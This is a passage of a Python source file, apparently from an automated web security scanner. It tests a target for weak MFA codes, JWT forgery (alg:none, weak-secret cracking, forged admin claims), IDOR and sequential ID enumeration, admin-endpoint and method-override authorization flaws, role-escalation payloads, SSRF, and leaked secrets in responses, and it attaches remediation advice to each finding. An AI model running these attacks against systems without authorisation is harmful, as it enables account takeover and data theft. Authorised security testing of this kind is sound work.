                    async with session.post(url, json={"code": otp, "otp": otp, "token": otp}) as resp:
                        if resp.status == 200:
                            body = await resp.text(errors="replace")
                            if any(k in body.lower() for k in ["success", "verified", "token", "access"]):
                                flaws.append({
                                    "type": "mfa_bypass",
                                    "endpoint": url,
                                    "method": "POST",
                                    "severity": "CRITICAL",
                                    "description": f"Weak OTP accepted at {path}: '{otp}' verified successfully",
                                    "proof": {"otp": otp, "status": resp.status},
                                    "remediation": [
                                        "Use cryptographically random OTPs (TOTP/HOTP)",
                                        "Implement rate limiting on OTP verification",
                                        "Lock account after N failed OTP attempts",
                                    ],
                                })
                                break
                except Exception as exc:
                    logger.debug("[Logic] MFA brute %s: %s", url, exc)
        return flaws

    # ------------------------------------------------------------------ #
    #  Memory Corruption                                                   #
    # ------------------------------------------------------------------ #

    async def _test_memory_corruption(
        self, session: aiohttp.ClientSession
    ) -> List[Dict[str, Any]]:
        """Test for memory corruption vulnerabilities using the memory corruption scanner."""
        try:
            # Test memory corruption against common vulnerable endpoints
            test_endpoints = [
                self.target + "/api/search",
                self.target + "/api/upload",
                self.target + "/api/process",
                self.target + "/search",
                self.target + "/upload",
            ]
            
            # Add discovered endpoints if available
            if self._discovered_endpoints:
                test_endpoints.extend([self.target + ep for ep in self._discovered_endpoints[:5]])  # Limit to 5
            
            all_vulns = []
            for endpoint in test_endpoints:
                try:
                    # Run memory corruption scan on this endpoint
                    vulns = await scan_memory_corruption(
                        target_url=endpoint,
                        headers=dict(session.headers) if session.headers else None,
                        method="POST",  # Test POST requests which are more likely to have parameters
                        timeout=self.timeout,
                        session=session,
                    )
                    all_vulns.extend(vulns)
                except Exception as exc:
                    logger.debug("[Logic] Memory corruption scan error on %s: %s", endpoint, exc)
            
            return all_vulns
        except Exception as exc:
            logger.debug("[Logic] Memory corruption scanner error: %s", exc)
            return []

    # ------------------------------------------------------------------ #
    #  Stack Overflow                                                     #
    # ------------------------------------------------------------------ #

    async def _test_stack_overflow(
        self, session: aiohttp.ClientSession
    ) -> List[Dict[str, Any]]:
        """Test for stack overflow vulnerabilities using the stack overflow scanner."""
        try:
            # Test stack overflow against common vulnerable endpoints
            test_endpoints = [
                self.target + "/api/search",
                self.target + "/api/upload",
                self.target + "/api/process",
                self.target + "/search",
                self.target + "/upload",
            ]
            
            # Add discovered endpoints if available
            if self._discovered_endpoints:
                test_endpoints.extend([self.target + ep for ep in self._discovered_endpoints[:5]])  # Limit to 5
            
            all_vulns = []
            for endpoint in test_endpoints:
                try:
                    # Run stack overflow scan on this endpoint
                    vulns = await scan_stack_overflow(
                        target_url=endpoint,
                        headers=dict(session.headers) if session.headers else None,
                        method="POST",  # Test POST requests which are more likely to have parameters
                        timeout=self.timeout,
                        session=session,
                    )
                    all_vulns.extend(vulns)
                except Exception as exc:
                    logger.debug("[Logic] Stack overflow scan error on %s: %s", endpoint, exc)
            
            return all_vulns
        except Exception as exc:
            logger.debug("[Logic] Stack overflow scanner error: %s", exc)
            return []

    # ------------------------------------------------------------------ #
    #  Heap Overflow                                                      #
    # ------------------------------------------------------------------ #

    async def _test_heap_overflow(
        self, session: aiohttp.ClientSession
    ) -> List[Dict[str, Any]]:
        """Test for heap overflow vulnerabilities using the heap overflow scanner."""
        try:
            # Test heap overflow against common vulnerable endpoints
            test_endpoints = [
                self.target + "/api/search",
                self.target + "/api/upload",
                self.target + "/api/process",
                self.target + "/search",
                self.target + "/upload",
            ]
            
            # Add discovered endpoints if available
            if self._discovered_endpoints:
                test_endpoints.extend([self.target + ep for ep in self._discovered_endpoints[:5]])  # Limit to 5
            
            all_vulns = []
            for endpoint in test_endpoints:
                try:
                    # Run heap overflow scan on this endpoint
                    vulns = await scan_heap_overflow(
                        target_url=endpoint,
                        headers=dict(session.headers) if session.headers else None,
                        method="POST",  # Test POST requests which are more likely to have parameters
                        timeout=self.timeout,
                        session=session,
                    )
                    all_vulns.extend(vulns)
                except Exception as exc:
                    logger.debug("[Logic] Heap overflow scan error on %s: %s", endpoint, exc)
            
            return all_vulns
        except Exception as exc:
            logger.debug("[Logic] Heap overflow scanner error: %s", exc)
            return []

    # ------------------------------------------------------------------ #
    #  HTTP Response Splitting                                            #
    # ------------------------------------------------------------------ #

    async def _test_http_response_splitting(
        self, session: aiohttp.ClientSession
    ) -> List[Dict[str, Any]]:
        """Test for HTTP response splitting vulnerabilities using the HTTP response splitting scanner."""
        try:
            # Test HTTP response splitting against common vulnerable endpoints
            test_endpoints = [
                self.target + "/api/search",
                self.target + "/api/upload",
                self.target + "/api/process",
                self.target + "/search",
                self.target + "/upload",
            ]
            
            # Add discovered endpoints if available
            if self._discovered_endpoints:
                test_endpoints.extend([self.target + ep for ep in self._discovered_endpoints[:5]])  # Limit to 5
            
            all_vulns = []
            for endpoint in test_endpoints:
                try:
                    # Run HTTP response splitting scan on this endpoint
                    vulns = await scan_http_response_splitting(
                        target_url=endpoint,
                        headers=dict(session.headers) if session.headers else None,
                        method="POST",  # Test POST requests which are more likely to have parameters
                        timeout=self.timeout,
                        session=session,
                    )
                    all_vulns.extend(vulns)
                except Exception as exc:
                    logger.debug("[Logic] HTTP response splitting scan error on %s: %s", endpoint, exc)
            
            return all_vulns
        except Exception as exc:
            logger.debug("[Logic] HTTP response splitting scanner error: %s", exc)
            return []

    # ------------------------------------------------------------------ #
    #  Helpers                                                             #
    # ------------------------------------------------------------------ #

    async def _fire_request(
        self, session: aiohttp.ClientSession, url: str, payload: Dict
    ) -> int:
        """Fire a single POST request and return the status code."""
        try:
            async with session.post(url, json=payload) as resp:
                return resp.status
        except Exception:
            return 0

    def _price_accepted(self, body: str, price: float) -> bool:
        """Heuristic: check if the response body indicates the price was accepted."""
        price_str = str(price)
        return (
            "success" in body.lower()
            or "created" in body.lower()
            or price_str in body
        )

    def _order_confirmed(self, body: str) -> bool:
        """Heuristic: check if the response body indicates order confirmation."""
        keywords = ["confirmed", "success", "completed", "order_id", "orderId"]
        body_lower = body.lower()
        return any(kw.lower() in body_lower for kw in keywords)

    # ------------------------------------------------------------------ #
    #  JWT Attack Testing                                                  #
    # ------------------------------------------------------------------ #

    async def _test_jwt_attacks(
        self, session: aiohttp.ClientSession
    ) -> List[Dict[str, Any]]:
        """
        Detect and attack JWT tokens found in the auth config or discovered responses.

        Attacks performed:
          1. alg:none bypass — forge a token with no signature
          2. Weak HMAC secret brute-force (50 common secrets)
          3. Claims tampering — promote role/admin in payload
          4. Verify the forged token is actually accepted by the server
        """
        from core.modules.jwt_analyzer import parse_token, attack_none, attack_brute, forge_custom, WEAK_SECRETS

        flaws: List[Dict[str, Any]] = []

        # ── Collect candidate tokens ──────────────────────────────────────
        candidate_tokens: List[str] = []

        # 1. From hunt config (token_user_a / token_user_b)
        for key in ("token_user_a", "token_user_b"):
            tok = self.config.get(key, "")
            if tok and tok.count(".") == 2 and tok.startswith("eyJ"):
                candidate_tokens.append(tok)

        # 2. From well-known auth endpoints — capture token in response
        _token_re = re.compile(r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*')
        auth_probe_paths = [
            "/api/auth/login", "/api/login", "/auth/login",
            "/api/token", "/api/auth/token",
        ]
        for path in auth_probe_paths:
            url = self.target.rstrip("/") + path
            try:
                await asyncio.sleep(self.rate_limit)
                async with session.post(
                    url,
                    json={"username": "admin", "password": "admin"},
                    timeout=aiohttp.ClientTimeout(total=5),
                ) as resp:
                    body = await resp.text(errors="replace")
                    for match in _token_re.findall(body):
                        if match not in candidate_tokens:
                            candidate_tokens.append(match)
            except Exception:
                pass

        if not candidate_tokens:
            return []

        # ── Protected endpoints to verify bypass ──────────────────────────
        protected_paths = [
            "/api/me", "/api/users/me", "/api/profile", "/api/admin",
            "/api/admin/users", "/api/account", "/dashboard",
        ] + [u for u in self._discovered_endpoints[:10]]

        async def _verify_token(token: str, label: str, original_endpoint: str) -> Optional[Dict]:
            """Send forged token and check if it grants access."""
            for path in protected_paths:
                url = path if path.startswith("http") else self.target.rstrip("/") + path
                try:
                    await asyncio.sleep(self.rate_limit)
                    async with session.get(
                        url,
                        headers={"Authorization": f"Bearer {token}"},
                        timeout=aiohttp.ClientTimeout(total=5),
                    ) as resp:
                        if resp.status == 200:
                            body = await resp.text(errors="replace")
                            # Must look like authenticated data, not a public page
                            if any(k in body.lower() for k in
                                   ("user", "email", "admin", "profile", "account", "role")):
                                return {
                                    "type":      "jwt_attack",
                                    "title":     f"JWT Bypass — {label}",
                                    "severity":  "critical",
                                    "endpoint":  url,
                                    "description": (
                                        f"Forged JWT accepted at {url}. Attack: {label}. "
                                        "Server does not properly validate JWT signatures."
                                    ),
                                    "evidence":  {
                                        "attack":           label,
                                        "original_endpoint": original_endpoint,
                                        "bypass_url":       url,
                                        "status":           resp.status,
                                        "forged_token":     token[:60] + "…",
                                    },
                                    "confirmed": True,
                                    "remediation": [
                                        "Always verify the JWT signature server-side",
                                        "Reject tokens with alg:none or alg:HS256 when RS256 is expected",
                                        "Rotate signing keys and use a strong random secret (≥256 bits)",
                                    ],
                                }
                except Exception:
                    pass
            return None

        for raw_token in candidate_tokens:
            parsed = parse_token(raw_token)
            if "error" in parsed:
                continue

            # Attack 1: alg:none
            none_result = attack_none(parsed, modified_payload={"role": "admin", "is_admin": True})
            if "token" in none_result:
                finding = await _verify_token(none_result["token"], "alg:none signature bypass", self.target)
                if finding:
                    flaws.append(finding)
                    continue  # confirmed bypass — skip further attacks on this token

            # Attack 2: weak secret brute-force
            brute_result = attack_brute(parsed, extra_secrets=WEAK_SECRETS[:50])
            if brute_result.get("cracked"):
                secret = brute_result["secret"]
                forged = forge_custom(parsed, {"role": "admin", "is_admin": True}, secret=secret)
                if "token" in forged:
                    finding = await _verify_token(forged["token"], f"weak secret '{secret}'", self.target)
                    if finding:
                        flaws.append(finding)
                    else:
                        # Secret cracked even if server didn't confirm bypass
                        flaws.append({
                            "type":      "jwt_weak_secret",
                            "title":     "JWT — Weak Signing Secret",
                            "severity":  "high",
                            "endpoint":  self.target,
                            "description": f"JWT signing secret cracked: '{secret}'. "
                                           "Attacker can forge arbitrary tokens.",
                            "evidence":  {"secret": secret, "algorithm": parsed.get("algorithm")},
                            "confirmed": True,
                            "remediation": [
                                "Use a cryptographically random secret of at least 256 bits",
                                "Prefer RS256/ES256 asymmetric algorithms over HS256",
                            ],
                        })

            # Attack 3: missing expiry claim is a finding on its own
            issues = parsed.get("claims_analysis", {}).get("issues", [])
            for issue in issues:
                if "never expires" in issue.lower():
                    flaws.append({
                        "type":      "jwt_no_expiry",
                        "title":     "JWT — No Expiration Claim",
                        "severity":  "medium",
                        "endpoint":  self.target,
                        "description": "JWT has no 'exp' claim — tokens are valid forever.",
                        "evidence":  {"payload": parsed.get("payload", {})},
                        "confirmed": True,
                        "remediation": ["Add 'exp' claim with a short TTL (e.g., 15–60 minutes)"],
                    })

        logger.info("[JWT] %d findings", len(flaws))
        return flaws

    # ------------------------------------------------------------------ #
    #  Param Miner                                                         #
    # ------------------------------------------------------------------ #

    async def _test_param_mining(
        self, session: aiohttp.ClientSession
    ) -> List[Dict[str, Any]]:
        """
        Discover hidden/undocumented parameters on discovered endpoints using
        differential response analysis (bisect wordlist approach).

        Hidden params found are injected back into self._discovered_endpoints
        so the injection tests (SQLi, XSS) can target them.
        """
        import core.modules.param_miner as _pm

        flaws: List[Dict[str, Any]] = []

        # Focus on the most meaningful discovered endpoints (max 4, prefer parameterless)
        from urllib.parse import urlparse as _up
        candidates = []
        for url in self._discovered_endpoints:
            parsed = _up(url)
            # Prefer clean paths — param miner adds its own params
            if not parsed.query and parsed.path not in ("/", ""):
                candidates.append(url)
            if len(candidates) >= 4:
                break
        # Fallback to hardcoded high-value API paths if nothing discovered
        if not candidates:
            candidates = [
                self.target.rstrip("/") + p
                for p in ("/api/users", "/api/search", "/api/products", "/api/v1/users")
            ]

        _PER_ENDPOINT_BUDGET = 180  # seconds — hard cap per URL

        for url in candidates:
            try:
                sid = _pm.create_session(url, method="GET", add_to="query")
                try:
                    await asyncio.wait_for(_pm._mine(sid), timeout=_PER_ENDPOINT_BUDGET)
                except asyncio.TimeoutError:
                    logger.debug("[ParamMiner] Time budget exceeded for %s — moving on", url)

                with _pm._lock:
                    session_data = _pm._sessions.get(sid, {})
                    raw_findings = list(session_data.get("findings", []))
                    _pm._sessions.pop(sid, None)

                for found in raw_findings:
                    param = found.get("param", "")
                    diff  = found.get("diff_length", 0)

                    # Extend discovered endpoints with the hidden param so injection
                    # tests can target it in subsequent checks
                    hidden_url = f"{url}?{param}=ds1test"
                    if hidden_url not in self._discovered_endpoints:
                        self._discovered_endpoints.append(hidden_url)

                    severity = "medium" if abs(diff) > 500 else "low"
                    flaws.append({
                        "type":      "hidden_parameter",
                        "title":     f"Hidden Parameter Found — {param}",
                        "severity":  severity,
                        "endpoint":  url,
                        "description": (
                            f"Parameter '{param}' not documented but processed by the server. "
                            f"Response length changed by {diff:+d} bytes (status: "
                            f"{found.get('status')} vs baseline {found.get('baseline_status')})."
                        ),
                        "evidence":  {
                            "param":            param,
                            "add_to":           found.get("add_to", "query"),
                            "status":           found.get("status"),
                            "baseline_status":  found.get("baseline_status"),
                            "diff_length":      diff,
                            "interesting":      found.get("interesting", ""),
                        },
                        "confirmed": True,
                        "remediation": [
                            "Document all accepted parameters in your API specification",
                            "Reject or ignore unexpected parameters server-side",
                            "Test discovered parameters for injection vulnerabilities",
                        ],
                    })

            except Exception as exc:
                logger.debug("[ParamMiner] Error on %s: %s", url, exc)

        logger.info("[ParamMiner] %d hidden params discovered", len(flaws))
        return flaws

    # ------------------------------------------------------------------ #
    #  Dedicated SSRF Testing                                             #
    # ------------------------------------------------------------------ #

    async def _test_ssrf_dedicated(
        self, session: aiohttp.ClientSession
    ) -> List[Dict[str, Any]]:
        """
        Run the dedicated SSRF tester against endpoints that carry SSRF-prone parameters
        (url, redirect, src, href, callback, webhook, etc.) from Phase 1 discovery.

        Falls back to hardcoded high-risk paths when nothing is discovered.
        """
        import core.modules.ssrf_tester as _ssrf
        from urllib.parse import urlparse as _up, parse_qs as _pqs

        flaws: List[Dict[str, Any]] = []

        _SSRF_PARAMS = frozenset({
            "url", "uri", "src", "href", "link", "target", "redirect",
            "redirect_url", "redirect_uri", "next", "return", "return_url",
            "callback", "callback_url", "webhook", "endpoint", "proxy",
            "fetch", "load", "image", "avatar", "icon", "logo", "picture",
            "download", "file", "document", "path", "backend", "service",
            "host", "domain", "origin", "location", "forward", "goto",
        })

        # Build candidate list: discovered endpoints with SSRF-prone params
        ssrf_targets: List[str] = []
        for url in self._discovered_endpoints:
            parsed = _up(url)
            qs = _pqs(parsed.query)
            if any(p.lower() in _SSRF_PARAMS for p in qs.keys()):
                ssrf_targets.append(url)

        # Also add hardcoded high-value API paths where SSRF params are common
        for suffix in ("/api/fetch", "/api/proxy", "/api/download",
                       "/api/webhook", "/api/import", "/api/upload"):
            ssrf_targets.append(self.target.rstrip("/") + suffix)

        # Cap to 12 targets to keep scan time bounded
        ssrf_targets = ssrf_targets[:12]

        auth_headers: Dict[str, Any] = {}
        if self.token:
            auth_headers["Authorization"] = f"Bearer {self.token}"
        if self.auth_manager:
            auth_headers.update(self.auth_manager.get_headers())

        oast = self.config.get("oast_domain", "")

        for url in ssrf_targets:
            try:
                sid = _ssrf.create_session(
                    url,
                    method="GET",
                    headers=auth_headers,
                    oast_domain=oast,
                    waf_bypass=self.config.get("waf_bypass", False),
                )
                # Call async runner directly — avoids spawning a new thread
                await _ssrf._run(sid)

                with _ssrf._lock:
                    raw = list(_ssrf._sessions.get(sid, {}).get("findings", []))
                    _ssrf._sessions.pop(sid, None)

                for f in raw:
                    # Already in hunter finding format
                    f.setdefault("source", "ssrf_tester")
                    flaws.append(f)

            except Exception as exc:
                logger.debug("[SSRF] Error on %s: %s", url, exc)

        logger.info("[SSRF] %d findings across %d targets", len(flaws), len(ssrf_targets))
        return flaws

    # ------------------------------------------------------------------ #
    #  IDOR / Broken Object Level Authorization (OWASP API #1)            #
    # ------------------------------------------------------------------ #

    async def _test_idor_bola(
        self, session: aiohttp.ClientSession
    ) -> List[Dict[str, Any]]:
        """
        Test for Insecure Direct Object References (IDOR / BOLA).

        Three attack vectors:
          1. Cross-user horizontal access — User B's token reads User A's resource
          2. Unauthenticated access — no token at all reaches a protected resource
          3. Sequential ID enumeration — increment/decrement numeric IDs to reach
             other users' objects
        """
        flaws: List[Dict[str, Any]] = []

        token_a: str = self.config.get("token_user_a", "") or self.token or ""
        token_b: str = self.config.get("token_user_b", "") or ""

        _RE_NUMERIC = re.compile(r'/(\d{1,10})(?:/|$|\?)')
        _RE_UUID    = re.compile(
            r'/([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})(?:/|$|\?)',
            re.I,
        )
        _SENSITIVE  = re.compile(
            r'"(email|username|user_id|userId|account_id|accountId|phone|ssn|'
            r'address|credit_card|password|token|secret|api_key|role|balance)"',
            re.I,
        )

        # ── Collect ID-bearing endpoints ──────────────────────────────────
        id_endpoints: List[tuple] = []
        seen_urls: set = set()

        for url in self._discovered_endpoints[:40]:
            for pattern, id_type in ((_RE_NUMERIC, "numeric"), (_RE_UUID, "uuid")):
                m = pattern.search(url)
                if m and url not in seen_urls:
                    seen_urls.add(url)
                    id_endpoints.append((url, m.group(1), id_type))
                    break

        # Augment with common API object patterns if discovery was sparse
        _COMMON_PATHS = [
            ("/api/users/1", "1", "numeric"),
            ("/api/users/2", "2", "numeric"),
            ("/api/profile/1", "1", "numeric"),
            ("/api/orders/1", "1", "numeric"),
            ("/api/account/1", "1", "numeric"),
            ("/api/v1/users/1", "1", "numeric"),
            ("/api/v2/users/1", "1", "numeric"),
            ("/api/documents/1", "1", "numeric"),
            ("/api/records/1", "1", "numeric"),
        ]
        for path, obj_id, id_type in _COMMON_PATHS:
            url = self.target.rstrip("/") + path
            if url not in seen_urls:
                seen_urls.add(url)
                id_endpoints.append((url, obj_id, id_type))

        id_endpoints = id_endpoints[:25]

        async def _fetch(url: str, token: str) -> tuple:
            headers: Dict[str, str] = {}
            if token:
                headers["Authorization"] = f"Bearer {token}"
            try:
                await asyncio.sleep(self.rate_limit)
                async with session.get(
                    url, headers=headers,
                    timeout=aiohttp.ClientTimeout(total=8),
                    allow_redirects=False,
                ) as resp:
                    body = await resp.text(errors="replace") if resp.status == 200 else ""
                    return resp.status, body
            except Exception:
                return None, ""

        for url, obj_id, id_type in id_endpoints:
            # Baseline — owner's access (token_a)
            base_status, base_body = await _fetch(url, token_a)
            if base_status != 200 or len(base_body) < 30:
                continue  # Endpoint not returning real data even for owner — skip

            # ── Test 1: Cross-user access (token_b reads token_a's resource) ──
            if token_b and token_b != token_a:
                b_status, b_body = await _fetch(url, token_b)
                if b_status == 200 and len(b_body) > 30:
                    body_lower = b_body.lower()
                    not_error = not any(
                        kw in body_lower
                        for kw in ("forbidden", "not found", "unauthorized", "access denied", "error")
                    )
                    has_data = _SENSITIVE.search(b_body) or len(b_body) >= len(base_body) * 0.4
                    if not_error and has_data:
                        flaws.append({
                            "type":      "idor",
                            "title":     f"IDOR — Cross-User Object Access (ID: {obj_id})",
                            "severity":  "critical",
                            "endpoint":  url,
                            "description": (
                                f"User B's token can read resource {url} owned by User A. "
                                "Object-level authorization (BOLA) check is absent."
                            ),
                            "evidence": {
                                "url":              url,
                                "object_id":        obj_id,
                                "owner_status":     base_status,
                                "attacker_status":  b_status,
                                "response_preview": b_body[:300],
                            },
                            "confirmed": True,
                            "remediation": [
                                "Check resource ownership on every GET/PUT/DELETE endpoint",
                                "Verify `request.user == resource.owner` before returning data",
                                "Use per-user opaque resource tokens instead of sequential IDs",
                            ],
                        })

            # ── Test 2: Unauthenticated access ────────────────────────────
            unauth_status, unauth_body = await _fetch(url, "")
            if unauth_status == 200 and len(unauth_body) > 30:
                if _SENSITIVE.search(unauth_body):
                    flaws.append({
                        "type":      "idor",
                        "title":     f"IDOR — Unauthenticated Object Access (ID: {obj_id})",
                        "severity":  "critical",
                        "endpoint":  url,
                        "description": (
                            f"Resource at {url} is accessible without any authentication token. "
                            "No authorization check is enforced."
                        ),
                        "evidence": {
                            "url":              url,
                            "object_id":        obj_id,
                            "status":           unauth_status,
                            "response_preview": unauth_body[:300],
                        },
                        "confirmed": True,
                        "remediation": [
                            "Require a valid authentication token for all object endpoints",
                            "Return 401 for missing tokens; 403 for insufficient permissions",
                        ],
                    })

            # ── Test 3: Sequential ID enumeration ─────────────────────────
            if id_type == "numeric":
                try:
                    n = int(obj_id)
                    alt_n = n + 1 if n < 999999 else n - 1
                    alt_url = url.replace(f"/{obj_id}", f"/{alt_n}", 1)
                    alt_status, alt_body = await _fetch(alt_url, token_a)
                    if alt_status == 200 and len(alt_body) > 30 and _SENSITIVE.search(alt_body):
                        flaws.append({
                            "type":      "idor",
                            "title":     f"IDOR — Sequential ID Enumeration (ID: {alt_n})",
                            "severity":  "high",
                            "endpoint":  alt_url,
                            "description": (
                                f"Incrementing the object ID from {obj_id} to {alt_n} exposes "
                                f"another user's data at {alt_url}. "
                                "Predictable IDs allow mass enumeration of all objects."
                            ),
                            "evidence": {
                                "original_url":     url,
                                "enumerated_url":   alt_url,
                                "original_id":      obj_id,
                                "enumerated_id":    str(alt_n),
                                "status":           alt_status,
                                "response_preview": alt_body[:300],
                            },
                            "confirmed": True,
                            "remediation": [
                                "Use UUIDs or cryptographically random identifiers",
                                "Enforce ownership checks regardless of ID format",
                                "Rate-limit and monitor sequential access patterns",
                            ],
                        })
                except (ValueError, TypeError):
                    pass

        logger.info("[IDOR] %d findings across %d endpoints", len(flaws), len(id_endpoints))
        return flaws

    # ------------------------------------------------------------------ #
    #  BFLA — Broken Function Level Authorization (OWASP API #5)          #
    # ------------------------------------------------------------------ #

    async def _test_bfla(
        self, session: aiohttp.ClientSession
    ) -> List[Dict[str, Any]]:
        """
        Test for Broken Function Level Authorization.

        Three vectors:
          1. Admin/privileged endpoint access with a regular-user token
          2. HTTP method override (X-HTTP-Method-Override) to invoke DELETE/PATCH
             on endpoints that only permit GET for the user's role
          3. Privilege self-escalation via PATCH/PUT on role/permission fields
        """
        flaws: List[Dict[str, Any]] = []

        # Prefer token_b as the "less privileged" attacker token
        user_token: str = (
            self.config.get("token_user_b", "")
            or self.config.get("token_user_a", "")
            or self.token
            or ""
        )
        if not user_token:
            return []

        _ADMIN_PATHS = [
            "/admin", "/admin/users", "/admin/dashboard", "/admin/settings",
            "/admin/config", "/admin/logs", "/admin/audit",
            "/api/admin", "/api/admin/users", "/api/admin/config", "/api/admin/stats",
            "/api/users",          # listing all users — typically admin-only
            "/api/v1/admin", "/api/v2/admin",
            "/management", "/manage", "/console",
            "/internal", "/internal/api", "/internal/health",
            "/debug", "/api/debug", "/api/debug/config",
            "/metrics", "/api/metrics",
            "/actuator", "/actuator/env", "/actuator/beans", "/actuator/configprops",
            "/api/statistics", "/api/stats", "/api/analytics",
            "/api/export", "/api/bulk", "/api/bulk-delete",
            "/api/impersonate", "/api/sudo",
        ]

        # Extract an example numeric ID from discovery for path templates
        _re_num = re.compile(r'/(\d{1,8})(?:/|$|\?)')
        example_id = "1"
        for ep in self._discovered_endpoints:
            m = _re_num.search(ep)
            if m:
                example_id = m.group(1)
                break

        async def _probe(
            url: str,
            method: str = "GET",
            token: str = "",
            body: Optional[Dict] = None,
            extra_headers: Optional[Dict] = None,
        ) -> tuple:
            headers: Dict[str, str] = dict(extra_headers or {})
            if token:
                headers["Authorization"] = f"Bearer {token}"
            try:
                await asyncio.sleep(self.rate_limit)
                kwargs: Dict[str, Any] = dict(
                    headers=headers,
                    timeout=aiohttp.ClientTimeout(total=8),
                    allow_redirects=False,
                )
                if body is not None:
                    kwargs["json"] = body
                async with session.request(method, url, **kwargs) as resp:
                    text = await resp.text(errors="replace")
                    return resp.status, text
            except Exception:
                return None, ""

        # ── Test 1: Admin endpoint access with regular-user token ─────────
        for path in _ADMIN_PATHS:
            url = self.target.rstrip("/") + path

            # Skip if the endpoint 404s even without auth — it doesn't exist
            no_auth_status, _ = await _probe(url, "GET", "")
            if no_auth_status in (None, 404, 410, 503):
                continue

            user_status, user_body = await _probe(url, "GET", user_token)
            if user_status == 200 and len(user_body) > 80:
                body_lower = user_body.lower()
                is_real = not any(
                    kw in body_lower
                    for kw in ("not found", "forbidden", "unauthorized", "access denied", "<!doctype")
                )
                if is_real:
                    flaws.append({
                        "type":      "bfla",
                        "title":     "BFLA — Admin Endpoint Accessible to Regular User",
                        "severity":  "critical",
                        "endpoint":  url,
                        "description": (
                            f"Admin endpoint {url} returned HTTP 200 with a regular-user token. "
                            "Function-level authorization is absent."
                        ),
                        "evidence": {
                            "url":              url,
                            "no_auth_status":   no_auth_status,
                            "user_status":      user_status,
                            "response_preview": user_body[:300],
                        },
                        "confirmed": True,
                        "remediation": [
                            "Apply role-based access control (RBAC) on every privileged endpoint",
                            "Verify the user's role server-side — never rely on client-sent role claims",
                            "Return 403 Forbidden for unauthorized access attempts (not 404)",
                        ],
                    })

            # ── Test 2: HTTP method override ──────────────────────────────
            for override in ("DELETE", "PUT", "PATCH"):
                ov_status, _ = await _probe(
                    url, "POST", user_token, body={},
                    extra_headers={
                        "X-HTTP-Method-Override": override,
                        "X-Method-Override":      override,
                        "X-Tunnel-Method":        override,
                    },
                )
                if ov_status in (200, 204):
                    flaws.append({
                        "type":      "bfla",
                        "title":     f"BFLA — HTTP Method Override ({override}) Accepted",
                        "severity":  "high",
                        "endpoint":  url,
                        "description": (
                            f"Server accepted X-HTTP-Method-Override: {override} at {url}. "
                            "Attackers can invoke restricted HTTP methods using the override header."
                        ),
                        "evidence": {
                            "url":             url,
                            "override_method": override,
                            "status":          ov_status,
                        },
                        "confirmed": True,
                        "remediation": [
                            "Disable HTTP method override support in production",
                            "If required, apply identical authorization to the overridden method",
                        ],
                    })

        # ── Test 3: Self-privilege escalation via role/permission fields ───
        _ESCALATION_OPS = [
            (f"/api/users/{example_id}/role",        "PATCH", {"role": "admin"}),
            (f"/api/users/{example_id}",             "PATCH", {"role": "admin", "is_admin": True}),
            (f"/api/users/{example_id}/permissions", "PUT",   {"permissions": ["admin", "superuser"]}),
            (f"/api/account/role",                   "PUT",   {"role": "admin"}),
            (f"/api/profile/role",                   "PUT",   {"role": "admin"}),
            (f"/api/profile",                        "PATCH", {"role": "admin", "is_staff": True}),
        ]
        for path, method, payload in _ESCALATION_OPS:
            url = self.target.rstrip("/") + path
            status, body = await _probe(url, method, user_token, body=payload)
            if status in (200, 204):
                body_lower = body.lower()
                if any(kw in body_lower for kw in ("admin", "role", "updated", "success", "ok", "true")):
                    flaws.append({
                        "type":      "bfla",
                        "title":     f"BFLA — Privilege Escalation via {method} {path}",
                        "severity":  "critical",
                        "endpoint":  url,
                        "description": (
                            f"A regular user can self-promote to admin via {method} {url}. "
                            "The server accepts client-controlled role/permission fields."
                        ),
                        "evidence": {
                            "url":              url,
                            "method":           method,
                            "payload":          payload,
                            "status":           status,
                            "response_preview": body[:200],
                        },
                        "confirmed": True,
                        "remediation": [
                            "Never accept role or permission fields from the client in update endpoints",
                            "Enforce immutability of 'role'/'is_admin' for self-update endpoints",
                            "Only administrators should be authorised to change user roles",
                        ],
                    })

        logger.info("[BFLA] %d findings", len(flaws))
        return flaws

    # ------------------------------------------------------------------ #
    #  Excessive Data Exposure (OWASP API #3)                             #
    # ------------------------------------------------------------------ #

    async def _test_excessive_data_exposure(
        self, session: aiohttp.ClientSession
    ) -> List[Dict[str, Any]]:
        """
        Detect API endpoints that return more sensitive data than necessary.

        Checks for: password hashes, plaintext secrets, PII fields (SSN, CC,
        phone), private keys, internal server paths, env-var leaks, and bulk
        user dumps where each object carries sensitive fields.
        """
        flaws: List[Dict[str, Any]] = []

        token: str = self.config.get("token_user_a", "") or self.token or ""

        _CHECKS: List[tuple] = [
            ("password_hash",
             re.compile(r'"(?:password|passwd|pwd|hash|pw)"\s*:\s*"[^"]{20,}"', re.I),
             "critical",
             "Password hash (or plaintext password) returned in API response"),
            ("ssn_pii",
             re.compile(r'"(?:ssn|social_security|tax_id|national_id)"\s*:\s*"[\d\-]{7,15}"', re.I),
             "critical",
             "Social Security / national ID number returned in API response"),
            ("credit_card",
             re.compile(r'"(?:cc|credit_card|card_number|pan|card_cvv|cvv)"\s*:\s*"[\d\- ]{13,19}"', re.I),
             "critical",
             "Credit / debit card number returned in API response"),
            ("private_key",
             re.compile(r'-----BEGIN (?:RSA |EC |DSA )?PRIVATE KEY-----', re.I),
             "critical",
             "Private cryptographic key material present in API response"),
            ("api_secret",
             re.compile(
                 r'"(?:api_key|api_secret|secret_key|access_key|private_key|client_secret)"\s*:\s*"[^"]{16,}"',
                 re.I,
             ),
             "high",
             "API key or secret credential returned in API response"),
            ("internal_token",
             re.compile(r'"(?:internal_token|service_token|machine_token|signing_key)"\s*:\s*"[^"]{10,}"', re.I),
             "high",
             "Internal service token/signing key returned in API response"),
            ("server_path",
             re.compile(r'"(?:file_path|server_path|internal_path|mount_path|disk_path)"\s*:\s*"/[^"]{4,}"', re.I),
             "medium",
             "Internal server filesystem path leaked in API response"),
            ("env_variable",
             re.compile(
                 r'"(?:DATABASE_URL|DB_PASSWORD|SECRET_KEY|REDIS_URL|AWS_SECRET|SMTP_PASS)"\s*:\s*"[^"]{4,}"',
                 re.I,
             ),
             "critical",
             "Environment variable / infrastructure secret leaked in API response"),
            ("bulk_user_dump",
             re.compile(
                 r'\[\s*\{[^]]{0,2000}"(?:email|username)"[^]]{0,2000}"(?:password|hash|secret|token)"',
                 re.I | re.DOTALL,
             ),
             "critical",
             "Bulk user dump with sensitive fields (email + password/hash/token) in API response"),
        ]

